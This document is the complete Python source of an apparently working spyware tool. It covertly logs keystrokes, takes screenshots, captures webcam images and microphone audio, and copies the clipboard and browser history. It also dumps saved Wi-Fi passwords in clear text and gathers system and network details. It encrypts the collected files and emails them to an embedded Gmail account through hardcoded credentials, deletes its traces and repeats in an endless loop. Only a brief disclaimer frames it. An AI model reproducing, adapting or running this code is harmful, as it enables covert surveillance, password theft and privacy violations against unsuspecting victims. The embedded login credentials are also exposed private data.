# This tool may be used for legal purposes only.  Users take full responsibility
# for any actions performed using this tool.  The author accepts no liability
# for damage caused by this tool.  If these terms are not acceptable to you, then
# do not use this tool.

# Built-in Modules #
import json
import logging
import pathlib
import os
import re
import shutil
import smtplib
import socket
import sys
import time
from email import encoders
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from multiprocessing import Process
from subprocess import CalledProcessError, check_output, Popen, TimeoutExpired
from threading import Thread

# External Modules #
import browserhistory as bh
import cv2
import requests
import sounddevice
from cryptography.fernet import Fernet
from PIL import ImageGrab
from pynput.keyboard import Listener
# from scipy.io.wavfile import write as write_rec

# If the OS is Windows #
if os.name == 'nt':
    import win32clipboard


'''
################
Function Index #
########################################################################################################################
SmtpHandler - Facilitates sending the emails with the encrypted data to be exfiltrated.
EmailAttach - Creates email attach object and returns it.
EmailHeader - Format email header and body.
SendMail - Facilitates sending emails in a segmented fashion based on regex matches.
Webcam - Captures webcam pictures every five seconds.
Microphone - Actively records microphone in 60 second intervals.
Screenshot - Captured screenshots every five seconds.
LogKeys - Detect and log keys pressed by the user.
PrintErr - Displays the passed in error message via stderr.
main - Gathers network information, clipboard contents, browser history, initiates multiprocessing, sends encrypted \
       results, cleans up exfiltrated data, and loops back to the beginning.
########################################################################################################################
'''


'''
########################################################################################################################
Name:       SmtpHandler
Purpose:    Facilitates sending the emails with the encrypted data to be exfiltrated.
Parameters: The email address, password, and the email to be sent.
Returns:    Nothing
########################################################################################################################
'''
def SmtpHandler(email_address: str, password: str, email):
    try:
        # Initiate Gmail SMTP session #
        with smtplib.SMTP('smtp.gmail.com', 587) as session:
            # Upgrade the session to TLS encryption #
            session.starttls()
            # Login to Gmail account #
            session.login(email_address, password)
            # Send the email and exit session #
            session.sendmail(email_address, email_address, email.as_string())
            session.quit()

    # If SMTP or socket related error occurs #
    except (OSError, smtplib.SMTPException) as mail_err:
        PrintErr(f'Error occurred during email session: {mail_err}')
        logging.exception(f'Error occurred during email session: {mail_err}\n\n')


'''
########################################################################################################################
Name:       EmailAttach
Purpose:    Creates email attach object and returns it.
Parameters: The path and file to be attached.
Returns:    The populated email attachment instance.
########################################################################################################################
'''
def EmailAttach(path: str, attach_file: str):
    # Create the email attachment object #
    attach = MIMEBase('application', "octet-stream")

    # Set file content as attachment payload #
    with open(f'{path}{attach_file}', 'rb') as attachment:
        attach.set_payload(attachment.read())

    # Encode attachment file in base64 #
    encoders.encode_base64(attach)
    # Add header to attachment object #
    attach.add_header('Content-Disposition', f'attachment;filename = {attach_file}')
    return attach


'''
########################################################################################################################
Name:       EmailHeader
Purpose:    Format email header and body.
Parameters: The email message and the email address associated with the message.
Returns:    The email message.
########################################################################################################################
'''
def EmailHeader(message, email_address: str):
    message['From'] = email_address
    message['To'] = email_address
    message['Subject'] = 'Success!!!'
    body = 'Mission is completed'
    message.attach(MIMEText(body, 'plain'))
    return message


'''
########################################################################################################################
Name:       SendMail
Purpose:    Facilitates sending emails in a segmented fashion based on regex matches.
Parameters: The path where the files to be emailed are stored and various compiled regex for matching attachment files.
Returns:    Nothing
########################################################################################################################
'''
def SendMail(path: str, re_xml, re_txt, re_png, re_jpg, re_wav):
    # User loging information #
    email_address = 'ngimbel64@gmail.com'          # <--- Enter your email address
    password = 'kkkieveeyerddgxf'               # <--- Enter email password

    # Create message object with text and attachments #
    msg = MIMEMultipart()
    # Format email header #
    EmailHeader(msg, email_address)

    # Iterate through files of passed in directory #
    for file in os.scandir(path):
        # If current item is dir #
        if os.path.isdir(file.name):
            continue

        # If the file matches file extension regex's #
        if re_xml.match(file.name) or re_txt.match(file.name) \
        or re_png.match(file.name) or re_jpg.match(file.name):
            # Turn file into email attachment #
            attachment = EmailAttach(path, file.name)
            # Attach file to email message #
            msg.attach(attachment)

        elif re_wav.match(file.name):
            # Create alternate message object for wav files #
            msg_alt = MIMEMultipart()
            # Format message header #
            EmailHeader(msg_alt, email_address)
            # Turn file into email attachment #
            attachment = EmailAttach(path, file.name)
            # Attach file to alternate email message #
            msg_alt.attach(attachment)
            # Send alternate email message #
            SmtpHandler(email_address, password, msg_alt)

    SmtpHandler(email_address, password, msg)


'''
########################################################################################################################
Name:       Webcam
Purpose:    Captures webcam pictures every five seconds.
Parameters: The file path where the logs will be stored.
Returns:    Nothing
########################################################################################################################
'''
def Webcam(file_path: str):
    # Create directory for webcam picture storage #
    cam_path = f'{file_path}WebcamPics'
    pathlib.Path(cam_path).mkdir(parents=True, exist_ok=True)

    # Initialize video capture instance #
    cam = cv2.VideoCapture(0)

    for x in range(0, 60):
        # Take picture of current webcam view #
        ret, img = cam.read()

        # If the OS is Windows #
        if os.name == 'nt':
            file = f'{cam_path}\\{x}webcam.jpg'
        # If the OS is Linux #
        else:
            file = f'{cam_path}/{x}webcam.jpg'

        # Save the image to as file #
        cv2.imwrite(file, img)
        # Sleep process 5 seconds #
        time.sleep(5)

    # Release camera control #
    cam.release()


'''
########################################################################################################################
Name:       Microphone
Purpose:    Actively records microphone in 60 second intervals.
Parameters: The file path where the logs will be stored.
Returns:    Nothing
########################################################################################################################
'''
def Microphone(file_path: str):
    # Import sound recording module in private thread #
    from scipy.io.wavfile import write as write_rec
    # Set recording frames-per-second and duration #
    fs = 44100
    seconds = 60

    for x in range(0, 5):
        # If the OS is Windows #
        if os.name == 'nt':
            # Initialize instance for microphone recording #
            my_recording = sounddevice.rec(int(seconds * fs), samplerate=fs, channels=2)
        # If the OS is Linux #
        else:
            # Initialize instance for microphone recording #
            my_recording = sounddevice.rec(int(seconds * fs), samplerate=fs, channels=1)

        # Wait time interval for the mic to record #
        sounddevice.wait()

        # If the OS is Windows #
        if os.name == 'nt':
            # Save the recording as wav file #
            write_rec(f'{file_path}{x}mic_recording.wav', fs, my_recording)
        # If the OS is Linux #
        else:
            # Save the recording as mp4 file #
            write_rec(f'{file_path}{x}mic_recording.mp4', fs, my_recording)


'''
########################################################################################################################
Name:       Screenshot
Purpose:    Captured screenshots every five seconds.
Parameters: The file path where the logs will be stored.
Returns:    Nothing
########################################################################################################################
'''
def Screenshot(file_path: str):
    # Create directory for screenshot storage #
    screen_path = f'{file_path}Screenshots'
    pathlib.Path(screen_path).mkdir(parents=True, exist_ok=True)

    for x in range(0, 60):
        # Capture screenshot #
        pic = ImageGrab.grab()

        # If the OS is Windows #
        if os.name == 'nt':
            # Save screenshot to file #
            pic.save(f'{screen_path}\\{x}screenshot.png')
        # If the OS is Linux #
        else:
            # Save screenshot to file #
            pic.save(f'{screen_path}/{x}screenshot.png')

        time.sleep(5)


'''
########################################################################################################################
Name:       LogKeys
Purpose:    Detect and log keys pressed by the user.
Parameters: The file path where the logs will be stored.
Returns:    Nothing
########################################################################################################################
'''
def LogKeys(file_path: str):
    # Set the log file and format #
    logging.basicConfig(filename=f'{file_path}key_logs.txt', level=logging.DEBUG,
                        format='%(asctime)s: %(message)s')

    # Join the keystroke listener thread #
    with Listener(on_press=lambda key: logging.info(str(key))) as listener:
        listener.join()


'''
########################################################################################################################
Name:       PrintErr
Purpose:    Displays the passed in error message via stderr.
Parameters: The error message to be displayed.
Returns:    Nothing
########################################################################################################################
'''
def PrintErr(msg: str):
    print(f'\n* [ERROR] {msg} *\n', file=sys.stderr)


'''
########################################################################################################################
Name:       main
Purpose:    Gathers network information, clipboard contents, browser history, initiates multiprocessing, sends \
            encrypted results, cleans up exfiltrated data, and loops back to the beginning.
Parameters: Nothing
Returns:    Nothing
########################################################################################################################
'''
def main():
    # If the OS is Windows #
    if os.name == 'nt':
        export_path = 'C:\\Tmp\\'
    # If the OS is Linux #
    else:
        export_path = '/tmp/logs/'

    # Ensure the tmp exfiltration dir exists #
    pathlib.Path(export_path).mkdir(parents=True, exist_ok=True)

    # Format program file names #
    network_file = f'{export_path}network_info.txt'
    sysinfo_file = f'{export_path}system_info.txt'
    browser_file = f'{export_path}browser_info.txt'

    try:
        # Open the network information file in write mode and log file in write mode #
        with open(network_file, 'w') as network_io:
            # If the OS is Windows #
            if os.name == 'nt':
                # Get the saved Wi-Fi network information, IP configuration, ARP table,
                # MAC address, routing table, and active TCP/UDP ports #
                commands = Popen(['Netsh', 'WLAN', 'export', 'profile', f'folder={export_path}', 'key=clear',
                                  '&', 'ipconfig', '/all', '&', 'arp', '-a', '&', 'getmac', '-V', '&', 'route',
                                  'print', '&', 'netstat', '-a'], stdout=network_io, stderr=network_io, shell=True)
            # If the OS is Linux #
            else:
                cmd0 = 'ifconfig'
                cmd1 = 'arp -a'
                cmd2 = 'route'
                cmd3 = 'netstat -a'

                # Get the IP configuration & MAC address, ARP table, routing table, and active TCP/UDP ports #
                commands = Popen(f'{cmd0}; {cmd1}; {cmd2}; {cmd3}',
                                 stdout=network_io, stderr=network_io, shell=True)

            try:
                # Execute child process #
                commands.communicate(timeout=60)

            # If execution timeout occurred #
            except TimeoutExpired:
                commands.kill()
                commands.communicate()

    # If IO error occurs with file #
    except (OSError, IOError) as file_err:
        PrintErr(f'Error occurred during file operation: {file_err}')
        logging.exception(f'Error occurred during file operation: {file_err}\n\n')

    # If the OS is Linux #
    if os.name != 'nt':
        try:
            # Open the network SSID list file in write mode #
            with open(f'{export_path}wifi_info.txt', 'w') as wifi_list:
                try:
                    # Get the available Wi-Fi networks with  nmcli #
                    get_wifis = check_output(['nmcli', '-g', 'NAME', 'connection', 'show'])

                # If error occurs during process #
                except CalledProcessError as proc_err:
                    logging.exception(f'Error occurred during Wi-Fi SSID list retrieval: {proc_err}\n\n')

                # If an SSID id list was successfully retrieved #
                if get_wifis:
                    # Iterate through command result line by line #
                    for wifi in get_wifis.decode().split('\n'):
                        # If not a wired connection #
                        if 'Wired' not in wifi:
                            try:
                                command = Popen(f'nmcli -s connection show {wifi}',
                                                stdout=wifi_list, stderr=wifi_list, shell=True)
                                # Execute child process #
                                command.communicate(timeout=60)

                            # If process error or timeout occurs #
                            except TimeoutExpired:
                                command.kill()
                                command.communicate()

        # If IO error during file operation #
        except (IOError, OSError) as file_err:
            PrintErr(f'Error occurred during file operation: {file_err}')
            logging.exception(f'Error occurred during file operation: {file_err}\n\n')

    # Get the hostname #
    hostname = socket.gethostname()
    # Get the IP address by hostname #
    ip_addr = socket.gethostbyname(hostname)

    try:
        with open(sysinfo_file, 'a') as system_info:
            try:
                # Query ipify API to retrieve public IP #
                public_ip = requests.get('https://api.ipify.org').text

            # If error occurs querying public IP #
            except requests.ConnectionError as conn_err:
                public_ip = f'* Ipify connection failed: {conn_err} *'

            # Log the public and private IP address #
            system_info.write(f'Public IP Address: {public_ip}\nPrivate IP Address: {str(ip_addr)}\n')

            # If the OS is Windows #
            if os.name == 'nt':
                get_sysinfo = Popen(['systeminfo', '&', 'tasklist', '&', 'sc', 'query'],
                                    stdout=system_info, stderr=system_info, shell=True)
            # If the OS is Linux #
            else:
                cmd0 = 'hostnamectl'
                cmd1 = 'lscpu'
                cmd2 = 'lsmem'
                cmd3 = 'lsusb'
                cmd4 = 'lspci'
                cmd5 = 'lshw'
                cmd6 = 'lsblk'
                cmd7 = 'df -h'

                get_sysinfo = Popen(f'{cmd0}; {cmd1}; {cmd2}; {cmd3}; {cmd4}; {cmd5}; {cmd6}; {cmd7}',
                                    stdout=system_info, stderr=system_info, shell=True)

            try:
                get_sysinfo.communicate(timeout=30)

            except TimeoutExpired:
                get_sysinfo.kill()
                get_sysinfo.communicate()

    # If IO error during file operation #
    except (IOError, OSError) as file_err:
        PrintErr(f'Error occurred during file operation: {file_err}')
        logging.exception(f'Error occurred during file operation: {file_err}\n\n')

    # If OS is Windows #
    if os.name == 'nt':
        # Copy the clipboard #
        win32clipboard.OpenClipboard()
        pasted_data = win32clipboard.GetClipboardData()
        win32clipboard.CloseClipboard()

        try:
            # Write the clipboard contents to output file #
            with open(f'{export_path}clipboard_info.txt', 'w') as clipboard_info:
                clipboard_info.write(f'Clipboard Data:\n{"*" * 16}\n{pasted_data}')

        # If IO error during file operation #
        except (IOError, OSError) as file_err:
            PrintErr(f'Error occurred during file operation: {file_err}')
            logging.exception(f'Error occurred during file operation: {file_err}\n\n')

    # Get the browser's username #
    bh_user = bh.get_username()
    # Gets path to database of browser #
    db_path = bh.get_database_paths()
    # Retrieves the user history #
    hist = bh.get_browserhistory()
    # Append the results into one list #
    browser_history = []
    browser_history.extend((bh_user, db_path, hist))

    try:
        # Write the results to output file in json format #
        with open(browser_file, 'w') as browser_txt:
            browser_txt.write(json.dumps(browser_history))

    # If IO error during file operation #
    except (IOError, OSError) as file_err:
        PrintErr(f'Error occurred during file operation: {file_err}')
        logging.exception(f'Error occurred during file operation: {file_err}\n\n')

    # Create and start processes #
    p1 = Process(target=LogKeys, args=(export_path,))
    p1.start()
    p2 = Process(target=Screenshot, args=(export_path,))
    p2.start()
    p3 = Thread(target=Microphone, args=(export_path,))
    p3.start()
    p4 = Process(target=Webcam, args=(export_path,))
    p4.start()

    # Join processes with 5 minute timeout #
    p1.join(timeout=300)
    p2.join(timeout=300)
    p3.join(timeout=300)
    p4.join(timeout=300)

    # Terminate processes #
    p1.terminate()
    p2.terminate()
    p4.terminate()

    files = ['network_info.txt', 'system_info.txt', 'browser_info.txt', 'key_logs.txt']
    # Compile xml regex #
    re_xml = re.compile(r'.{1,255}\.xml$')

    # If the OS is Windows #
    if os.name == 'nt':
        # Add clipboard file to list #
        files.append('clipboard_info.txt')

        # Append file to file list if item is file and match xml regex #
        [files.append(file.name) for file in os.scandir(export_path) if re_xml.match(file.name)]
    # If the OS is Linux #
    else:
        files.append('wifi_info.txt')

    # In the python console type: from cryptography.fernet import Fernet ; then run the command
    # below to generate a key. This key needs to be added to the key variable below as
    # well as in the DecryptFile.py that should be kept on the exploiter's system. If either
    # is forgotten either encrypting or decrypting process will fail. #
    # Command -> Fernet.generate_key()
    key = b'T2UnFbwxfVlnJ1PWbixcDSxJtpGToMKotsjR4wsSJpM='

    # Iterate through files to be encrypted #
    for file in files:
        try:
            # Read the file plain text data #
            with open(f'{export_path}{file}', 'rb') as plain_text:
                data = plain_text.read()

            # Encrypt the file data #
            encrypted = Fernet(key).encrypt(data)

            # Write the encrypted data to fresh file #
            with open(f'{export_path}e_{file}', 'wb') as hidden_data:
                hidden_data.write(encrypted)

            # Delete the plain text data #
            os.remove(f'{export_path}{file}')

        # If error occurs during file operation #
        except (IOError, OSError) as file_err:
            PrintErr(f'Error occurred during file operation: {file_err}')
            logging.exception(f'Error occurred during file operation: {file_err}\n\n')

    # Compile regex's for attaching files #
    re_txt = re.compile(r'.{1,255}\.txt$')
    re_png = re.compile(r'.{1,255}\.png$')
    re_jpg = re.compile(r'.{1,255}\.jpg$')

    # If the OS is Windows #
    if os.name == 'nt':
        re_audio = re.compile(r'.{1,255}\.wav$')
    # If the OS is Linux #
    else:
        re_audio = re.compile(r'.{1,255}\.mp4')

    # Exfiltrate encrypted results via email #
    SendMail(export_path, re_xml, re_txt, re_png, re_jpg, re_audio)
    # If the OS is Windows #
    if os.name == 'nt':
        SendMail(f'{export_path}Screenshots\\', re_xml, re_txt, re_png, re_jpg, re_audio)
        SendMail(f'{export_path}WebcamPics\\', re_xml, re_txt, re_png, re_jpg, re_audio)
    # If the OS is Linux #
    else:
        SendMail(f'{export_path}Screenshots/', re_xml, re_txt, re_png, re_jpg, re_audio)
        SendMail(f'{export_path}WebcamPics/', re_xml, re_txt, re_png, re_jpg, re_audio)

    # Clean Up Files #
    shutil.rmtree(export_path)

    # Loop #
    main()


if __name__ == '__main__':
    try:
        main()

    # If Ctrl + C is detected #
    except KeyboardInterrupt:
        print('* Control-C entered...Program exiting *')

    # If unknown exception occurs #
    except Exception as ex:
        PrintErr(f'Unknown exception occurred: {ex}')
        sys.exit(1)

    sys.exit(0)
